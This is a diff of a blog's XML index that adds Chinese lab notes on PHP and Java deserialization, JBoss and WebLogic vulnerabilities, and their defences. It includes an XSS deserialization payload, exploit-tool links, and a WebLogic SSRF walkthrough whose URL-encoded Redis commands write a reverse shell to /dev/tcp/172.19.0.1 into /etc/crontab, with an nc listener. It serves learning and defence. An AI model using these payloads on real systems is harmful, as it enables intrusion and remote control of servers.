@@ -877,7 +877,15 @@
   <entry>
     <title>XXE</title>
     <url>/2020/09/12/XXE/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p> </p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>渗透测试</tag>
+      </tags>
   </entry>
   <entry>
     <title>中间人攻击</title>
@@ -952,14 +960,77 @@
 <p>Struts2.5.12版本。：struts2-rest-showcase因为我的版本无漏洞就先把操作过程如下</p>
 <p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.jpg" alt="img"></p>
 <p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.jpg" alt="img"></p>
-<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>就是把一个对象变成可以传输的字符串，目的就是为了方便传输。假设，我们写了一个class，这个class里面存有一些变量。当这个class被实例化了之后，在使用过程中里面的一些变量值发生了改变。以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等着下一次要用它的时候再一次被调用的话，浪费系统资源。当我们写一个小型的项目可能没有太大的影响，但是随着项目的壮大，一些小问题被放大了之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再放他出来就好了。在我们讲PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数。</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>就是把一个对象变成可以传输的字符串，目的就是为了方便传输。假设，我们写了一个class，这个class里面存有一些变量。当这个class被实例化了之后，在使用过程中里面的一些变量值发生了改变。以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等着下一次要用它的时候再一次被调用的话，浪费系统资源。当我们写一个小型的项目可能没有太大的影响，但是随着项目的壮大，一些小问题被放大了之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再放他出来就好了。在我们讲PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数。</p>
 <p><strong>详细参考</strong>：</p>
 <p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
-<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>serialize()和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>serialize()和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</p>
 <p>当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的 payload。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。</p>
-<h4 id="完成反序列化pikachu实试"><a href="#完成反序列化pikachu实试" class="headerlink" title="完成反序列化pikachu实试"></a>完成反序列化pikachu实试</h4><p>在线反序列化工具：<a href="https://links.jianshu.com/go?to=https://www.w3cschool.cn/tools/index?name=unserialize">https://www.w3cschool.cn/tools/index?name=unserialize</a></p>
+<p><strong>⛵PHP反序列化函数：</strong>serialize()，unserialize()</p>
+<p><strong>⛵Java反序列化函数：</strong>ObjectOutputStream的writeObject()和ObjectInputStream的readObject()。</p>
+<p>⛵常见的几个魔法函数：魔法函数前边都会有</p>
+<p>__</p>
+<p>__construct()当一个对象创建时被调用</p>
+<p>__destruct()当一个对象销毁时被调用</p>
+<p>__toString()当一个对象被当作一个字符串使用</p>
+<p>__sleep() 在对象在被序列化之前运行</p>
+<p>__wakeup将在序列化之后立即被调用</p>
+<h3 id="完成反序列化pikachu实试"><a href="#完成反序列化pikachu实试" class="headerlink" title="完成反序列化pikachu实试"></a>完成反序列化pikachu实试</h3><p>在线反序列化工具：<a href="https://links.jianshu.com/go?to=https://www.w3cschool.cn/tools/index?name=unserialize">https://www.w3cschool.cn/tools/index?name=unserialize</a></p>
 <p>输入payload：O:1:”S”:1:{s:4:”test”;s:29:”alert(‘xss’)”;}</p>
 <p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.jpg" alt="img"></p>
+<h3 id="完成jboss反序列化合webshell"><a href="#完成jboss反序列化合webshell" class="headerlink" title="完成jboss反序列化合webshell"></a>完成jboss反序列化合webshell</h3><p>历史漏洞参考;<a href="https://www.seebug.org/appdir/JBoss">https://www.seebug.org/appdir/JBoss</a></p>
+<p><a href="https://www.jianshu.com/p/e34062e0a6f1">https://www.jianshu.com/p/e34062e0a6f1</a></p>
+<p>新漏洞利用工具下载：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></p>
+<p>老漏洞综合利用工具下载：<a href="https://download.csdn.net/download/sinat_26474359/10650591">https://download.csdn.net/download/sinat_26474359/10650591</a></p>
+<p>我们使用java反序列化利用程序工具目标地址直接接根目录就行</p>
+<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.jpg" alt="img"></p>
+<p>命令执行时用dir /s c:\jboss\index.jsp这种格式</p>
+<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.jpg" alt="img"></p>
+<h3 id="jboss、Weblogic、redis默认端口号"><a href="#jboss、Weblogic、redis默认端口号" class="headerlink" title="jboss、Weblogic、redis默认端口号"></a>jboss、Weblogic、redis默认端口号</h3><p>Jboss默认端口号8080</p>
+<p>Weblogic默认端口号7001</p>
+<p>Redis默认端口号6379</p>
+<h3 id="Weblogic反序列化、文件上传漏洞实验，记住漏洞编号"><a href="#Weblogic反序列化、文件上传漏洞实验，记住漏洞编号" class="headerlink" title="Weblogic反序列化、文件上传漏洞实验，记住漏洞编号"></a>Weblogic反序列化、文件上传漏洞实验，记住漏洞编号</h3><h4 id="文件上传漏洞实验"><a href="#文件上传漏洞实验" class="headerlink" title="文件上传漏洞实验"></a>文件上传漏洞实验</h4><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.jpg" alt="img"></p>
+<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.jpg" alt="img"></p>
+<h4 id="Weblogic反序列化"><a href="#Weblogic反序列化" class="headerlink" title="Weblogic反序列化"></a>Weblogic反序列化</h4><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.jpg" alt="img"></p>
+<h4 id="任意文件上传漏洞操作（CVE-2018-2894）"><a href="#任意文件上传漏洞操作（CVE-2018-2894）" class="headerlink" title="任意文件上传漏洞操作（CVE-2018-2894）"></a>任意文件上传漏洞操作（CVE-2018-2894）</h4><h3 id="Weblogic-ssrf漏洞利用过程"><a href="#Weblogic-ssrf漏洞利用过程" class="headerlink" title="Weblogic  ssrf漏洞利用过程"></a>Weblogic  ssrf漏洞利用过程</h3><p>参考：<a href="https://www.jianshu.com/p/97b157a20108">https://www.jianshu.com/p/97b157a20108</a></p>
+<p><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/bmjoker/p/9759761.html">https://www.cnblogs.com/bmjoker/p/9759761.html</a></p>
+<p>1、检测漏洞:直接访问：<a href="https://links.jianshu.com/go?to=http://ip:7001/uddiexplorer/">http://ip:7001/uddiexplorer/</a>,</p>
+<p>     SSRF漏洞存在于<a href="https://links.jianshu.com/go?to=http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp">http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
+<p>2、向服务器提交以下参数</p>
+<blockquote>
+<p>rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=<a href="http://127.0.0.1:7001/">http://127.0.0.1:7001</a></p>
+</blockquote>
+<p>关键点是operator这个参数，访问7001端口时返回一个404的状态码。</p>
+<p>3、访问一个不存在的端口会返回以下信息。</p>
+<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.jpg" alt="img"></p>
+<p>可以通过返回的信息不同，来判断端口开放的状态。</p>
+<p>经过探测，我们发现了内网的一个IP存在6379端口，也就是redis服务：</p>
+<p>我们这里要发送几行代码</p>
+<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
+<p>把这三条命令通过get包注入进去，先要将命令用url进行编码</p>
+<p>注意，换行符是“\r\n”，也就是“%0D%0A”</p>
+<blockquote>
+<p>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</p>
+</blockquote>
+<p>然后我们把构造好的数据包通过burp进行发送 , 将url编码后的字符串放在ssrf的域名后面，发送：</p>
+<p>接着靶机上开启端口监听，nc-lvnp 21 ,反弹shell。成功。</p>
+<h3 id="反序列化及命令执行防范方法"><a href="#反序列化及命令执行防范方法" class="headerlink" title="反序列化及命令执行防范方法"></a>反序列化及命令执行防范方法</h3><h4 id="🚢反序列化漏洞防御："><a href="#🚢反序列化漏洞防御：" class="headerlink" title="🚢反序列化漏洞防御："></a><strong>🚢反序列化漏洞防御：</strong></h4><p>1、类的白名单校验机制：</p>
+<p> 实际上原理很简单，就是对所有传入的反序列化对象，在反序列化过程开始前，对类型名称做一个检查，不符合白名单的类不进行反序列化操作。很显然，这个白名单肯定是不存在Runtime的。</p>
+<p>2、 禁止JVM执行外部命令Runtime.exec </p>
+<p>这个措施可以通过扩展 SecurityManager 可以实现。      </p>
+<h4 id="PHP防御"><a href="#PHP防御" class="headerlink" title="PHP防御"></a>PHP防御</h4><p>1、安全配置好php相关参数：通过Php配置文件里面有个disable_functions = 配置，这个禁止某些php函数，</p>
+<p>服务器便是用这个来禁止php的执行命令函数。</p>
+<p><strong>🪂例如：</strong>disable_functions=system,passthru,shell_exec,exec,popen 便禁止了用这些函数来执行系统命令。</p>
+<p>2、升级中间件</p>
+<p>3、严格控制传入变量，严谨使用魔法函数</p>
+<h4 id="weblogic防御"><a href="#weblogic防御" class="headerlink" title="weblogic防御"></a>weblogic防御</h4><p>1、过滤T3协议，限定可连接的IP</p>
+<p>2、设置Nginx反向代理，实现t3协议和http协议隔离</p>
+<p>3、JEP290（JDK8u121，7u131，6u141），这个机制主要是在每层反序列化过程中都加了一层黑名单处理</p>
+<h4 id="原生反序列化防御"><a href="#原生反序列化防御" class="headerlink" title="原生反序列化防御"></a>原生反序列化防御</h4><p>1、不要反序列化不可信的数据</p>
+<p>2、 给反序列数据加密签名，并确保解密在反序列之前</p>
+<p>3、给反序列化接口添加认证授权</p>
+<p>4、 反序列化服务只允许监听在本地或者开启相应防火墙</p>
+<p>5、 升级第三方库</p>
+<p>6、升级JDK，JEP290</p>
 ]]></content>
       <categories>
         <category>网络安全</category>
